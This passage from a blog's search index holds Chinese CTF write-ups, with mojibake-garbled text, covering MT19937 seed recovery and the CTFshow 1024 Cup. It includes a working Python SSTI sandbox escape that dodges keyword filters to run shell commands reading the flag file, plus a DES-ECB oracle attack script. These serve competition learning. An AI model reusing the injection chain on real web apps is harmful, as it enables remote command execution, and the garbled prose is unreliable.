range(bits//shift): tmp = res ^ tmp &lt;&lt; shift &amp; mask return tmpdef backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(5,-1,-1): tmp = state[i+624]^state[i+397] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 # recover highest bit res = tmp&amp;high # recover other 31 bits,when i =0,it just use the method again it so beautiful!!!! tmp = state[i-1+624]^state[i+396] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return statedef recover_state(out): state = [] for i in out: i = inverse_right(i,18) i = inverse_left_values(i,15,0xefc60000) i = inverse_left_values(i,7,0x9d2c5680) i = inverse_right(i,11) state.append(i) return statec = []partS = recover_state(c)state = backtrace([0]*6+partS)[:624]# print(state)# state[0]ä¸å‡†ç¡®ï¼Œå› state[0]==seedï¼Œå•æ¨# inv = invert(1812433253,1&lt;&lt;32)# seed = inverse_right(((state[1]-1)*inv)%(1&lt;&lt;32),30)# state[0] = int(seed)prng = Random()prng.setstate((3,tuple(state+[0]),None))flag = &quot;flag&#123;&quot; + &#x27;&#x27;.join(str(prng.getrandbits(32)) for _ in range(4)) + &quot;&#125;&quot;print(flag) æ±‚seedï¼ˆé€† __init__ï¼‰æ ¹æ®ç¬¬ä¸€æ¬¡çš„ stateï¼Œé€†å‘ seedã€‚ 123456789101112131415161718192021222324252627282930from gmpy2 import invertdef _int32(x): return int(0xFFFFFFFF &amp; x)def init(seed): mt = [0] * 624 mt[0] = seed for i in range(1, 624): mt[i] = _int32(1812433253 * (mt[i - 1] ^ mt[i - 1] &gt;&gt; 30) + i) return mtdef invert_right(res,shift): tmp = res for i in range(32//shift): res = tmp^res&gt;&gt;shift return _int32(res)def recover(last): n = 1&lt;&lt;32 inv = invert(1812433253,n) for i in range(623,0,-1): last = ((last-i)*inv)%n last = invert_right(last,30) return lastseed = 2080737669state = init(seed)print(recover(state[-1]) == seed) å‚è€ƒ æµ…æMT19937ä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"æµå¯†ç ","slug":"æµå¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"CTFshow 1024æ¯","slug":"match-CTFshow-1024æ¯","date":"2020-10-25T09:29:24.000Z","updated":"2020-10-28T12:06:19.448Z","comments":true,"path":"2020/10/25/match-CTFshow-1024æ¯/","permalink":"https://lazzzaro.github.io/2020/10/25/match-CTFshow-1024%E6%9D%AF/","excerpt":"","text":"â€‹ æ¯”èµ›ï¼šCTFshow 1024æ¯å¹³å°ï¼šhttps://ctf.showå¼€å§‹ï¼š2020/10/23 18:00ç»“æŸï¼š2020/10/25 18:00é¢˜ç›®ï¼š web æ‚é¡¹ å¯†ç  é€†å‘ pwn å„3é“è§„åˆ™ï¼š1 æ¯”èµ›æœŸé—´å¯ä»¥éšæ„è®¨è®ºï¼Œwpé¡»åœ¨æ¯”èµ›ç»“æŸåå‘å¸ƒï¼Œwpç»Ÿä¸€å‘å¸ƒåœ°å€ï¼šhttps://wp.ctf.show2 å…¬å¹³ç«æŠ€ï¼Œç‹¬ç«‹æ¯”èµ›3 æœåŠ¡å™¨ä¸è¦çˆ†ç ´ï¼Œä¸è¦æ”»å‡»æœåŠ¡å™¨ï¼Œä¸è¦æ‰«æ!!!4 å¥–å“ï¼šæ­¦åŠŸç§˜ç±ä¸€æœ¬ï¼Œ(100å…ƒä»¥å†…) å‡ºé¢˜ï¼šcrypto1+re1 Web1024_WEBç­¾åˆ°call_user_func()å‡½æ•°ç¬¬1ä¸ªå‚æ•°ä¸ºå‡½æ•°åï¼Œä¼ å…¥phpinfo åœ¨Configurationä¸­å‘ç°ä¸èµ·çœ¼çš„è‡ªå®šä¹‰ctfshowé¡¹ï¼Œå†…æœ‰è‡ªå®šä¹‰å‡½æ•°ctfshow_1024 supportï¼Œä¼ å€¼å¾—flagã€‚ â€‹ 1024_fastapié¡µé¢å›æ˜¾ä¸€ä¸ªJSONæ•°æ®ï¼Œäº†è§£ä¸€ä¸‹fastapiã€‚ FastAPI æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ Web æ¡†æ¶ï¼Œç”¨äºæ„å»º APIã€‚ ä¸»è¦ç‰¹æ€§ï¼š å¿«é€Ÿï¼šéå¸¸é«˜çš„æ€§èƒ½ï¼Œä¸ NodeJS å’Œ Go ç›¸å½“ å¿«é€Ÿç¼–ç ï¼šå°†åŠŸèƒ½å¼€å‘é€Ÿåº¦æé«˜çº¦ 200ï¼… è‡³ 300ï¼… æ›´å°‘çš„é”™è¯¯ï¼šå‡å°‘çº¦ 40ï¼… çš„äººä¸ºé”™è¯¯ ç›´è§‚ï¼šå¼ºå¤§çš„ç¼–è¾‘å™¨æ”¯æŒï¼Œè‡ªåŠ¨è¡¥å…¨æ— å¤„ä¸åœ¨ï¼Œè°ƒè¯•æ—¶é—´æ›´å°‘ ç®€æ˜“ï¼šæ—¨åœ¨æ˜“äºä½¿ç”¨å’Œå­¦ä¹ ï¼Œå‡å°‘é˜…è¯»æ–‡æ¡£çš„æ—¶é—´ã€‚ ç®€çŸ­ï¼šå‡å°‘ä»£ç é‡å¤ã€‚ ç¨³å¥ï¼šè·å–å¯ç”¨äºç”Ÿäº§ç¯å¢ƒçš„ä»£ç ï¼Œå…·æœ‰è‡ªåŠ¨äº¤äº’å¼æ–‡æ¡£ åŸºäºæ ‡å‡†ï¼šåŸºäºå¹¶å®Œå…¨å…¼å®¹ API çš„å¼€æ”¾æ ‡å‡† OpenAPI å’Œ JSON Schema å‘ç°å…¶è‡ªå¸¦äº¤äº’å¼APIæ–‡æ¡£ï¼Œè®¿é—®/docsé¡µï¼Œæœ‰é‡‡ç”¨POSTæ–¹å¼ä¼ å‚çš„/cccalcccé¡µï¼Œå‚æ•°qä¼ å…¥è®¡ç®—å¼å¾—åˆ°ç»“æœã€‚ å› ä¸ºæ˜¯pythonæ¡†æ¶ï¼Œå°è¯•ä½¿ç”¨SSTIï¼Œåå¤æµ‹è¯•å„ç§è¾“å…¥ï¼Œå‘ç°ç»“æœä¸ºlistæˆ–stringç±»å‹çš„éƒ½Internal Server Erroræˆ–ç»“æœä¸ºç©ºï¼Œå°è¯•å°†stringåˆ‡ç‰‡æ˜¾ç¤ºï¼Œå‘ç°æˆåŠŸï¼š str([].__class__.__base__.__subclasses__()[25])[1:] å›æ˜¾ï¼š&#123;&quot;res&quot;:&quot;class &#39;property&#39;&gt;&quot;,&quot;err&quot;:false&#125; å°è¯•æŸ¥æ‰¾warnings.catch_warningsæ‰€åœ¨ä¸‹æ ‡ï¼Œä»¥è¿›ä¸€æ­¥å‘½ä»¤æ‰§è¡Œã€‚çˆ†ç ´ä¸‹æ ‡è¾“å‡ºå„å…ƒç´ ï¼š 1234567import requestsurl=&#x27;http://6aeaea7f-b079-4159-9ac8-d29a4b828174.chall.ctf.show/cccalccc&#x27;for i in range(500): data=&#123;&#x27;q&#x27;:&#x27;str([].__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;])[1:]&#x27;&#125; r=requests.post(url,data) print(r.text) å‘ç°ä¸‹æ ‡189ä¸ºwarnings.catch_warningsï¼Œå°è¯• [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;) å‘ç°è¿‡æ»¤äº†importå’Œsystemå…³é”®å­—ï¼Œ&#39;import&#39;ç”¨&#39;__imp&#39;+&#39;ort__&#39;ä»£æ›¿ï¼Œsystemç”¨popenä»£æ›¿ï¼Œ åˆ—ç›®å½•ï¼š [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls&#39;).read() æ ¹ç›®å½•æ— flagæ–‡ä»¶ï¼Œå•ä¸ªç›®å½•æŸ¥æ‰¾flagå…³é”®å­—ï¼š [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;find /app | xargs grep flag&#39;).read() æŸ¥åˆ°ç»“æœï¼š &quot;/app/main.py: hint = \\&quot;flag is in /mnt/f1a9,try to read it\\&quot;\\n/app/start.sh:source flag.sh\\n&quot;, è¯»å–æ‹¿flagï¼š [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;cat /mnt/f1a9&#39;).read() â€‹ Misc1024_ç­¾åˆ° é™„ä»¶åœ°å€ï¼šhttps://ctfshow.lanzoui.com/iEuSDhlkxsj åŒ…å«å¾ˆå¤šè¡Œx y d textç±»å‹çš„æ•°æ®ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯Dijkstraç®—æ³•æ±‚æœ€çŸ­è·¯å¾„è¿æˆflagï¼Œè·‘è„šæœ¬å‘ç°æ—¶é—´å¤æ‚åº¦å¤ªé«˜ æš´åŠ›æŸ¥æ‰¾ï¼Œä»ag&#123;æŸ¥æ‰¾å¾—åˆ°çš„ç»“æœï¼Œå†é¡ºç€yå€¼ï¼ˆ$y_k$ï¼‰æ‰¾ä»¥yå€¼å¼€å¤´çš„xå€¼ï¼ˆ$x_{k+1}=y_k$ï¼‰çš„è¡Œï¼Œè¿æ¥textå¾—flagã€‚ â€‹ 1024_é‡æ–°ç­¾åˆ° é™„ä»¶ï¼šMisc-2-.zip ç±»ä¸‰å±‚å¥—å¨ƒã€‚ level 1 æ–‡ä»¶å°¾æç¤ºIt&#39;s all numbersï¼Œæ™®é€šçˆ†ç ´æ— æœ å‡ºé¢˜äººæç¤ºCRCçˆ†ç ´ï¼Œå‹ç¼©åŒ…å†…æ–‡ä»¶ä¸º10å­—èŠ‚æ•°å­—ï¼ŒCRC=0x342F0E5Cï¼Œ10å­—èŠ‚CRCçˆ†ç ´ï¼š 12345678910from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom binascii import crc32def brute_force(): return bruteforce(lambda x:crc32(x.encode())==int(&#x27;342F0E5C&#x27;,16),string.digits,length=10,method=&#x27;fixed&#x27;)print(brute_force()) å¥½åœ¨è®¾ç½®çš„æ•°å­—ä¸å¤§ï¼Œçº¦1minå¾—ç»“æœï¼Œä¸ºlevel 2å¯†ç ã€‚ level 2 jpgå›¾ç‰‡steghideéšå†™ï¼Œè§£å‡ºtxtæ–‡ä»¶ï¼Œå†…å®¹ï¼šå¯†ç æ˜¯ä»€ä¹ˆå‘€ã€‚ level 3 å‹ç¼©åŒ…æ³¨é‡ŠThe password is 32 bits.ï¼Œç»“åˆlevel 2è§£å‡ºçš„æç¤ºï¼Œå„ç§å¯èƒ½çš„32ä½md5å€¼éƒ½ä¸è¡Œï¼Œç»å‡ºé¢˜äººåå¤æé†’ï¼Œæ‰çŸ¥é“32æ˜¯æ•…æ„ç•™çš„å‘ï¼ŒçœŸæ­£çš„åŠ å¯†æ–¹å¼æ˜¯shaï¼ˆå•¥ï¼‰ï¼Œå°è¯•sha1åŠ å¯†ä»€ä¹ˆå‘€è§£å‡ºflagã€‚ â€‹ 1024_å…”è€³ é™„ä»¶åœ°å€:https://ctfshow.lanzoui.com/iO0PPhlly5i å¸¦å™ªéŸ³çš„æ‘©æ–¯å¯†ç ï¼Œè€Œä¸”è¿˜å¾ˆé•¿ï¼Œä¸ä¼šç”¨è„šæœ¬å»å™ª+è¯†åˆ«ï¼Œç›´æ¥ç¡¬æã€‚ å†…å®¹ä¸­å¿…å®šå«flagæˆ–FLAGå…³é”®å­—ï¼Œæ‰¾åˆ°..-. .-.. .- --.ç‰¹å¾çš„ä¸€æ®µï¼Œæ¥ç€åé¢å°±æ˜¯flagå€¼ã€‚ â€‹ 1024_éå¸¸ç®€å• é™„ä»¶ï¼š6.zip + jpg 6.zip çˆ†ç ´6ä½æ•°å­—å¯†ç +base92+base64+æ‘©æ–¯å¯†ç ï¼Œå¾—the endã€‚ jpg åˆ†ç¦»zipæ–‡ä»¶ï¼Œtxtä¸­ä¸ä½›è®ºç¦…è§£å¯†å¾—ä¸€ä¸²æ•°å­—ï¼Œç»“åˆæç¤ºï¼ˆä½å¤´æ€è€ƒ/è€äººæœºæ‰“å­—ï¼‰æ‰‹æœºé”®ç›˜è§£å¯†å¾—zipå¯†ç ï¼› ç¬¬äºŒå±‚zipï¼Œtxtå†…å®¹ä¸ºå¯†æ–‡ï¼Œæ–‡ä»¶åæç¤ºï¼ˆä½ æ€•è›‡å—ï¼‰ä¸ºSerpentåŠ å¯†ï¼Œç”¨åœ¨çº¿è§£å¯†ç½‘ç«™è§£å¯†ï¼Œå¯†é’¥ä¸º6.zipå¾—åˆ°çš„the endï¼Œè§£å‡ºä¸ºzipå¯†ç ï¼Œæ‰“å¼€å¾—flagã€‚ â€‹ 1024_1024zipå¥—å¨ƒ é™„ä»¶ï¼š1024.zip å¸¦å¯†ç çš„å¤šå±‚zipå¥—å¨ƒï¼Œä¸”å¯†ç ä¸º0124å››ç§æ•°å­—ç»„æˆï¼Œåªèƒ½ç”¨è„šæœ¬ï¼Œç”Ÿæˆæ–°çš„åˆ é™¤æ—§çš„ã€‚ 12345678910111213141516171819202122232425262728import zipfile import osnow = &quot;1024.zip&quot;while 1: print(&quot;~~&quot;+now) zfile = zipfile.ZipFile(now) passFile=open(&#x27;dic.txt&#x27;) #å…ˆç”¨0124å…¨æ’åˆ—åšå­—å…¸ for line in passFile.readlines(): try: password = line.strip(&#x27;\\n&#x27;) zfile.extractall(members=zfile.namelist(), pwd=password.encode(&#x27;utf-8&#x27;)) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break break except: pass print(&#x27;~~~~&#x27;+now) è§£åˆ°æœ€ç»ˆçš„2048å±‚flag.txtè¯´å»çœ‹1024å±‚ï¼Œå¥½åœ¨è„šæœ¬æŠŠä¸­é—´çš„æ–‡ä»¶è¾“å‡ºä¸”æœªåˆ é™¤1024.txtæ–‡ä»¶ï¼Œ hex+hex+b64+b32+hex+b64+hex+b64+hex+b32+b32+hex+b64+zipï¼Œå¾—åˆ°flagã€‚ â€‹ 1024_è°ƒé¢‘æ”¶éŸ³æœº é™„ä»¶åœ°å€ï¼šhttps://ctfshow.lanzoui.com/iPAJehln1zc audacityæ‰“å¼€ï¼Œåˆ‡åˆ°é¢‘è°±å›¾ï¼Œå‘ç°01æ³¢å½¢ï¼Œä¸ä¼šå†™è„šæœ¬ï¼ŒæŠŠ01å­—ç¬¦ä¸²æ‰‹æ’¸ä¸‹æ¥ï¼Œ å°è¯•æŒ‰å­—èŠ‚åˆ†å‰²æ— æœï¼Œè½¬æˆå­—ç¬¦ä¸²å¾—åˆ°åŒ…å«569aå››ç§å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œä¸ºæ›¼å½»æ–¯ç‰¹ç¼–ç ï¼Œè„šæœ¬è§£ç ï¼Œå¾—åˆ°æ ‡å‡†æ›¼å½»æ–¯ç‰¹ç¼–ç çš„è§£ç ç»“æœä¸ºflagã€‚ â€‹ 1024_å¤§å¨å¤©é¾™ é€ä½ ä¸€å¥ç®´è¨€â€œå¤§å¨å¤©é¾™ï¼Œä¸–å°Šåœ°è—ï¼Œèˆ¬è‹¥è¯¸ä½›ï¼Œèˆ¬è‹¥å·´å˜›å“„â€ ä¿®æ”¹pngé«˜åº¦ï¼Œå‘ç°éæ–‡å­—ç‰ˆä¸ä½›è®ºç¦…ï¼Œæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™OCRè¯†åˆ«æ–‡å­—å¹¶æ£€æŸ¥ä¿®æ­£ï¼Œ ä¿®æ­£åï¼Œä¸ä½›è®ºç¦…+æ–°ä¸ä½›è®ºç¦…+ä¸ç†Šè®ºé“+ä¸ä½›è®ºç¦…V2ï¼Œå¾—åˆ°flagã€‚ â€‹ Crypto1024_TrickRSAå‘+ä¸€ç‚¹æ•°è®ºæ¨å¯¼æŠ€å·§ã€‚ $e_1d \\equiv e_2(d+1024) \\equiv 1 \\pmod {\\varphi(n)}$ å³ $(e_1-e_2)d \\equiv 1024e_2 \\pmod {\\varphi(n)}$ ä¸¤è¾¹ä¹˜ä»¥ $e_1$ ï¼Œæœ‰ $(e_1-e_2)e_1d \\equiv 1024e_2e_1 \\pmod {\\varphi(n)}$ å›  $e_1d \\equiv 1 \\pmod {\\varphi(n)}$ï¼Œåˆ™ $e_1-e_2 \\equiv 1024e_2e_1 \\pmod {\\varphi(n)}$ å³ $e_1-e_2-1024e_1e_2 \\equiv 0 \\pmod {\\varphi(n)}$ å³ $e_1-e_2-1024e_1e_2 = k\\varphi(n), k\\in \\mathbb{Z}$ $e_1,e_2$ å·²çŸ¥ï¼Œå¯ä»¥è®¡ç®—å‡º $\\varphi(n)$ çš„å€æ•°å€¼ $k\\varphi(n)$ ç”¨ $k\\varphi(n)$ å¯æ±‚å‡ºå¯¹åº”çš„ $dâ€™$å€¼ï¼š$e_1dâ€™ \\equiv 1 \\pmod {k\\varphi(n)}$ è”ç«‹ $e_1d \\equiv 1 \\pmod {\\varphi(n)}$ï¼Œæœ‰ $d=dâ€™\\pmod {\\varphi(n)}$ æ•… $m=c^{dâ€™} \\pmod n$ã€‚ 12345678910import gmpy2n=e1=e2=enc=kphi = (e1-e2)-1024*e2*e1dd = gmpy2.invert(e1, kphi)msg = pow(enc, dd, n)print(bytes.fromhex(hex(msg)[2:])) â€‹ 1024_éº»è¾£å…”å¤´ç¬¬ä¸ƒé”… å°ç™½å…”ï¼Œç™½åˆç™½ï¼Œè·³å‡ºæ …æ è¿›é”…æ¥ é™„ä»¶ï¼štutu.txt æ˜æ˜¾æç¤ºçš„æ …æ å¯†ç ï¼Œçœ‹åˆ°æ•´ä¸ªå¯†æ–‡ç”¨æ™®é€šå’ŒWå‹è§£éƒ½ä¸å¯¹ï¼Œ ä»”ç»†çœ‹å¯†æ–‡ä¸­åªæœ‰ä¸€å¯¹&#123;å’Œ&#125;ï¼Œä¸”&#123;å‰30ä¸ªå­—èŠ‚å†…æœ‰f/l/a/gå››ç§å­—æ¯ï¼Œä¸”é—´éš”ç›¸ç­‰ï¼Œ æˆªå–få¼€å¤´åˆ°&#125;ç»“å°¾çš„å­—ç¬¦ä¸²ï¼Œå°è¯•æŒ‰6ä½ä¸€è¡Œå–å‡ºå¹¶è§‚å¯Ÿæ¯è¡Œé¦–å­—æ¯ï¼Œflagéƒ¨åˆ†ä¸º0-få­—ç¬¦ï¼Œè°ƒæ•´ç¬¬15è¡Œä¹‹åä¸º5ä½ä¸€è¡Œï¼Œæœ€åæ¯è¡Œé¦–å­—æ¯è¿æˆflagã€‚ â€‹ 1024_å¯†ç ç³»ç»Ÿ 1024å¯†ç ç³»ç»Ÿï¼Œhave funï¼ï¼ï¼ DES-ECBæ¨¡å¼æ”»å‡»ï¼Œå‚è€ƒï¼šhttps://www.jianshu.com/p/8aef410a2eae æ•´ä½“æ€è·¯ï¼š ç”±è„šæœ¬å¾—çŸ¥ä¸º8ä½åˆ†ç»„çš„DES-ECBåŠ å¯†ï¼Œæ¯å—8ä½æ˜æ–‡å•ç‹¬åŠ å¯†å¾—8ä½å¯†æ–‡ï¼Œåˆå› keyç”±ä¸¤ç§å­—ç¬¦ä¸²éšæœºé€‰æ‹©ç”¨äºåŠ å¯†ï¼Œæ¯å—8ä½æ˜æ–‡å¯¹åº”çš„å¯†æ–‡æœ‰ä¸¤ç§å¯èƒ½ã€‚ ç»“åˆè„šæœ¬è§‚å¯Ÿè¾“å‡ºå€¼ï¼Œæ˜¯å¯†æ–‡ $c$ ç»è¿‡ $c^{12}+rand(10^{1023},10^{1024})$ å¤„ç†çš„ï¼Œå‡è®¾ $c^{12}+rand(10^{1023},10^{1024}) \\lt(c+1)^{12}$ é‚£ä¹ˆå¯¹è¾“å‡ºå€¼ç›´æ¥å¼€12æ¬¡æ–¹å–æ•´å³ä¸º $c$ã€‚ æ˜æ–‡ç”±è¾“å…¥å€¼m+flag+paddingç»„æˆï¼Œ$m$ ä¸ºç©ºæ—¶ï¼Œ $c$ å¯åˆ† $k$ å—ï¼Œä¸æ–­è°ƒæ•´ $m$ çš„é•¿åº¦ï¼Œç›´åˆ° $m$ é•¿åº¦ä¸º $l+1$ æ—¶ $c$ å¯åˆ† $k+1$ å—ï¼Œé‚£ä¹ˆè¯´æ˜ $m$ é•¿åº¦ä¸º $l$ æ—¶ $c$ åˆšå¥½å¯åˆ† $k$ å—ï¼Œå³æ— paddingæƒ…å†µä¸‹ï¼Œ$m+flag$ å¯åˆ† $k$ å—ï¼Œåˆ™flagé•¿åº¦å³ä¸º $8k-l$ã€‚ åˆ©ç”¨ä¸Šé¢çš„æ€æƒ³ï¼Œåœ¨ $m$ é•¿åº¦ä¸º $l$ çš„åŸºç¡€ä¸Šï¼Œé•¿åº¦ä¸æ–­åŠ 1ï¼Œåˆ™å¯ä»¥æŠŠflagä»åå¼€å§‹çš„æ¯ä¸€ä½æ¨åˆ°ä¸‹ä¸€ä¸ªå—ä¸­ï¼Œå¾—åˆ°ä¸‹ä¸€ä¸ªå—çš„å¯†æ–‡ $c_i$ï¼› åˆå·²çˆ†ç ´å‡ºçš„flagä½+paddingå·²çŸ¥ï¼Œåˆ™ä¸‹ä¸€ä¸ªå—çš„æ„æˆä¸ºæœªçŸ¥å­—ç¬¦1ä½+å·²çˆ†ç ´å‡ºçš„flagä½(+padding)ï¼› æ ¹æ®DES-ECBçš„æ€§è´¨ï¼Œç›¸åŒæ˜æ–‡å—å¯¹åº”çš„å¯†æ–‡å—ç›¸åŒã€‚çˆ†ç ´ç¬¬ä¸€ä½æœªçŸ¥å­—ç¬¦ï¼Œå°†ä¸Šé¢çš„å—æ„æˆä½œä¸ºè¾“å…¥å€¼è¾“å…¥ï¼Œå¾—åˆ°å¯¹åº”çš„å¯†æ–‡çš„ç¬¬ä¸€å—ï¼Œåˆ†åˆ«ä¸å®é™…å¯†æ–‡ $c_i$ æ¯”è¾ƒï¼ŒåŒ¹é…çš„å³ä¸ºæ­£ç¡®çš„æ˜æ–‡å­—ç¬¦ã€‚ ä»¥æ­¤ç±»æ¨ï¼Œå¾—åˆ°å®Œæ•´flagã€‚ 123456789101112131415161718192021222324252627282930313233343536373839#DES-ECBæ¨¡å¼è¿ä½œæµ‹è¯•è„šæœ¬from Crypto.Cipher import DESfrom binascii import b2a_hex, a2b_hexfrom itertools import *import randomimport gmpy2def Encode_1024sys(data,key): data_list = [data[i:i+8] for i in range(0,len(data),8)] print(data_list) k1 = DES.new(key.encode(), DES.MODE_ECB) k2 = DES.new(key[::-1].encode(), DES.MODE_ECB) data_res = &#x27;&#x27; for i in range(0,len(data_list)): k = random.choice([k1,k2]) c = k.encrypt(data_list[i].encode()) data_res += b2a_hex(c).decode() print(b2a_hex(c).decode()) return data_resdef Encode_1024(data,key): len_data=len(data) choices = cycle(&#x27;1024&#x27;) while len_data%8!=0: data += next(choices) len_data=len(data) data_res = Encode_1024sys(data,key) print(data_res) print() data_out = hex(int(data_res,16)**12 + random.randint(10**1023,10**1024))[2:] return data_outmsg=&#x27;*&#x27;*19test_flag=&#x27;10120120414410412041101201204144104120&#x27;test_key=&#x27;messages&#x27;out=Encode_1024(msg+test_flag,test_key)print(out)print()print(hex(gmpy2.iroot(int(out,16),12)[0])) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#è§£é¢˜è„šæœ¬from pwn import *import gmpy2import stringhost = &#x27;111.231.70.44&#x27;port = 28045block = 8secret_len = 38ori_padding_len = block-secret_len%blockdef getCliphertext(data): return hex(gmpy2.iroot(int(data,16),12)[0])[2:]p = connect(host,port)dic = &#x27;0124&#x27;padding = [&#x27;1024102&#x27;,&#x27;102410&#x27;,&#x27;10241&#x27;,&#x27;1024&#x27;,&#x27;102&#x27;,&#x27;10&#x27;,&#x27;1&#x27;,&#x27;&#x27;]flag = &#x27;&#x27;for i in range(secret_len): prob=[] find=0 payload = &#x27;*&#x27;*(ori_padding_len+i+1) group = i//block for j in range(20): p.recvuntil(&#x27;&gt; &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;msg: &#x27;) p.sendline(payload) p.recvuntil(&#x27;is : &#x27;) data = p.recvline() data = getCliphertext(data) print([data[i:i+16] for i in range(0,len(data),16)]) print(data) if group == 0: prob.append(data[-16:]) else: prob.append(data[-16*(group+1):-16*(group+1)+16]) prob=list(set(prob)) print(str(i+1)+&#x27; prob = &#x27;+str(prob)) for j in dic: p.recvuntil(&#x27;&gt; &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;msg: &#x27;) flag_suffix = flag[:min(len(flag),7)] payload = j + flag_suffix + padding[min(len(flag_suffix),7)] print(payload) p.sendline(payload) p.recvuntil(&#x27;is : &#x27;) data = p.recvline() data = getCliphertext(data) print(data[:16]) if data[:16] in prob: flag = j + flag print(str(i+1)+&#x27; flag = &#x27;+flag) print() find=1 break if find == 0: print(str(i+1)+&#x27; cannot find!&#x27;) break print(flag)#44414440122401244401404424404421440414 æœ€åå¾—åˆ°çš„flagä¸²å¹¶ä¸æ˜¯çœŸæ­£çš„flagï¼Œæç¤ºä¸º01248ï¼Œå³äº‘å½±å¯†ç ï¼ŒæŒ‰0åˆ†éš”ï¼Œå…¶ä»–æ•°éš”å¼€åç»„åˆåŠ å’Œï¼Œè½¬åŒ–ä¸º1-26å¯¹åº”çš„å­—æ¯ï¼Œå¾—åˆ°æœ€ç»ˆflagã€‚ â€‹ Reverse1024_æŠ½è±¡è¯­è¨€æ‰‹é€†pythonå­—èŠ‚ç ã€‚æºç ç”¨python -m dis code.pyç”Ÿæˆã€‚ å­—èŠ‚ç è¿˜åŸçš„ç›¸å…³åˆ†æå‚è€ƒï¼š https://docs.python.org/zh-cn/3/library/dis.html https://bbs.pediy.com/thread-262577.htm å¾—åˆ°æºç ï¼š 1234567891011121314151617181920212223242526272829import base64k = 0_ = 0c = b&quot;...&quot; #base64å¯†æ–‡ç•¥c = base64.b64decode(c).decode().split(&quot;,&quot;)def x(n): if n &gt; 1: for i in range(2, n): if (n % i) == 0: return False break return True else: return Falsez = lambda n: (2 ** n) - 1out = &#x27;&#x27;while _ &lt; len(c): if x(z(k)): out += chr(int(c[_]) ^ z(k)) _ += 1 k += 1print(out.join([&#x27;flag&#123;&#x27;,&#x27;&#125;&#x27;])) cè§£å‡ºçš„listä¸æ»¡è¶³å‡½æ•°x()æ¡ä»¶çš„ $2^k-1$ åˆ†åˆ«å¼‚æˆ–å¾—åˆ°ç»“æœï¼Œè€Œx()ä¸­åˆ¤æ–­ $2^k-1$ æ˜¯å¦ä¸ºç´ æ•°ã€‚ ç›´æ¥è¿è¡Œåœ¨çŸ­æ—¶é—´åªèƒ½å¾—åˆ°å‰å‡ ä½çš„ç»“æœï¼Œæ˜¯å› ä¸º $2^k-1$ çš„å€¼ä¸ºæŒ‡æ•°çº§å¢é•¿ï¼Œè€Œä¸”x()ä¸­åˆéœ€å¯¹æ¯ä¸ªæ•°ä»2è‡³å½“å‰æ•°éå†ï¼Œéå¸¸è€—æ—¶ã€‚ æ¢ä¸ªè§’åº¦ï¼Œcçš„listé•¿åº¦ä¸º47ï¼Œé‚£ä¹ˆåªéœ€å¯»æ‰¾å‰47ä¸ªæ»¡è¶³ $2^k-1$ ä¸ºç´ æ•°çš„ $k$ å€¼å³å¯ã€‚ å‚è€ƒï¼šæ¢…æ£®ç´ æ•° æ¢…æ£®æ•°ï¼Œæ˜¯æŒ‡å½¢å¦‚ $2^pï¼1$ çš„ä¸€ç±»æ•°ï¼Œå…¶ä¸­æŒ‡æ•° $p$ æ˜¯æ­£æ•´æ•°ï¼Œå¸¸è®°ä¸º $M_p$ ã€‚å¦‚æœæ¢…æ£®æ•°æ˜¯ç´ æ•°ï¼Œå°±ç§°ä¸ºæ¢…æ£®ç´ æ•°ã€‚ ç”¨å› å¼åˆ†è§£æ³•å¯ä»¥è¯æ˜ï¼Œè‹¥ $2^nï¼1$ æ˜¯ç´ æ•°ï¼Œåˆ™æŒ‡æ•° $n$ ä¹Ÿæ˜¯ç´ æ•°ï¼›åä¹‹ï¼Œå½“ $n$ æ˜¯ç´ æ•°æ—¶ï¼Œ$2^nï¼1$ï¼ˆå³$M_p$ï¼‰å´æœªå¿…æ˜¯ç´ æ•°ã€‚å‰å‡ ä¸ªè¾ƒå°çš„æ¢…æ£®æ•°å¤§éƒ½æ˜¯ç´ æ•°ï¼Œç„¶è€Œæ¢…æ£®æ•°è¶Šå¤§ï¼Œæ¢…æ£®ç´ æ•°ä¹Ÿå°±è¶Šéš¾å‡ºç°ã€‚ ç›®å‰ä»…å‘ç°51ä¸ªæ¢…æ£®ç´ æ•°ï¼Œæœ€å¤§çš„æ˜¯ $M_{82589933}$ï¼ˆå³ $2^{82589933}-1$ï¼‰ï¼Œæœ‰ $24862048$ ä½ã€‚ å¯è§æ»¡è¶³æ¢…æ£®ç´ æ•°ï¼ˆ$2^k-1$ï¼‰çš„æ¢…æ£®æŒ‡æ•°ï¼ˆ$k$ å€¼ï¼‰å¿…å®šä¹Ÿæ˜¯ç´ 